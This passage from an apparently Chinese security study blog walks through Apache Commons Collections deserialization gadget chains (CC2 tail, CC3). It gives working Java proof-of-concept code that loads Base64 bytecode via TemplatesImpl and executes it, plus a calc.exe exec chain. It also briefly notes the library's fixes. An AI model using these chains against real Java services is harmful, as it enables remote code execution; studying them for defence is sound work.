class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getBytescode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Comparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);<br>        queue.add(obj);<br>        queue.add(obj);<br><br>        setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="官方修复方法"><a href="#官方修复方法" class="headerlink" title="官方修复方法"></a>官方修复方法</h2><ul><li>PriorityQueue的利用链是否支持在CC3中利用?</li><li>Apache Commons Collections官方如何修复漏洞</li></ul><p>第一个不行，因为TransformingComparator没有实现serializable接口</p><p>第二个问题在CC3版本下增加了一个方法<code>FunctorUtils#checkUnsafeSerialization</code> ，⽤于检测反序列化是否安全。如果开发者没有设置全局配置 <code>org.apache.commons.collections.enableUnsafeSerialization=true</code> ，即默认情况下会抛出异常。</p><p>这个检查在常⻅的危险Transformer类</p><p>（ InstantiateTransformer 、 InvokerTransformer 、 PrototypeFactory 、 CloneTransformer 等）的 readObject ⾥进⾏调⽤，所以，当我们反序列化包含这些对象时就会抛出⼀个异常：</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191237655.png" alt="image-20230220195203458"> </p><p>而在CC4版本中，上面的危险Transformer类不实现Serializable接口，也就是说他们完全无法序列化和反序列化了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CC3</title>
    <link href="/Decemberus.github-io/2022/11/10/CC3(2)/"/>
    <url>/Decemberus.github-io/2022/11/10/CC3(2)/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><p><code>TemplatesImpl</code>是一个可以加载字节码的类，通过调用<code>newTransformer()</code>方法，即可执行这段字节码的类构造器，那么尝试再反序列化中利用这个特性执行任意代码</p><p>利用TemplatesImpl执行字节码的办法是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span>  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-type">byte</span>[] code =Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        obj.newTransformer();<span class="hljs-comment">//调用newTransformer来触发漏洞</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而下面是CC1利用<code>transformMap</code>执行任意方法的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections1_p</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;C:/Windows/System32/calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结合这两段poc，可以改造出执行任意字节码的CC利用链，只需要改变第二个demo中的<code>InvokerTranformer</code>的方法改为<code>newTransformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(obj),<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>解释一下这里改为newTransformer的意义</p><p>通过创建一个名为InvokerTransformer的对象并调用其中的“newTransformer()”方法，可以生成一个能够执行Transformer对象的实例</p><p>这个方法将返回一个新的Transformer对象，它可以对输入的XML文档进行转换。这个新的Transformer对象被用来作为恶意代码中的常量，用于构建一个Transformer[]数组。</p></blockquote><p>改造后如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span>  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-type">byte</span>[] code =Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(obj),<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br> &#125;;<br> <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br><span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191237794.png" alt="image-20230216213233419"> </p><p>但现在的代码和CC3仍然不同，CC3没有用到<code>InvokerTransformer</code></p><p>因为<code>InvokerTransformer</code>被某种工具加入了黑名单，所以我们不能够使用这个方法，而是应该用到<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p><p>这个类中调用了<code>(TransformerImpl) templates.newTransformer()</code> ，免去了我们使⽤<code>InvokerTransformer</code>⼿⼯调⽤ <code>newTransformer()</code> ⽅法这⼀步</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191237189.png" alt="image-20230217162413033"> </p><p>但很明显我们无法调用构造方法，总不能实例化一个对象去调用吧，于是我们使用<code>org.apache.commons.collections.functors.InstantiateTransformer</code>这个类，它实现了Transformer接口，作用是调用构造方法</p><p>于是利用链有了</p><p>利用<code>InstantiateTransformer</code>调用<code>TrAXFilter</code>的构造方法，再利用构造方法里面的<code>templates.newTransformer</code>调用<code>TemplatesImpl</code>里面的字节码</p><p>于是我们的利用链是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<span class="hljs-comment">// 创建一个 ConstantTransformer，将 TrAXFilter 类作为常量值传递</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj&#125;)<span class="hljs-comment">// 创建一个 InstantiateTransformer，用于实例化 TemplatesImpl 对象,如此一来就可以调用构造方法来调用transform方法了</span><br>&#125;;<br>        &#125;;<br></code></pre></td></tr></table></figure><p>替换到前面的demo中，发现成功运行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-type">byte</span>[] code =Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj&#125;)<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br>        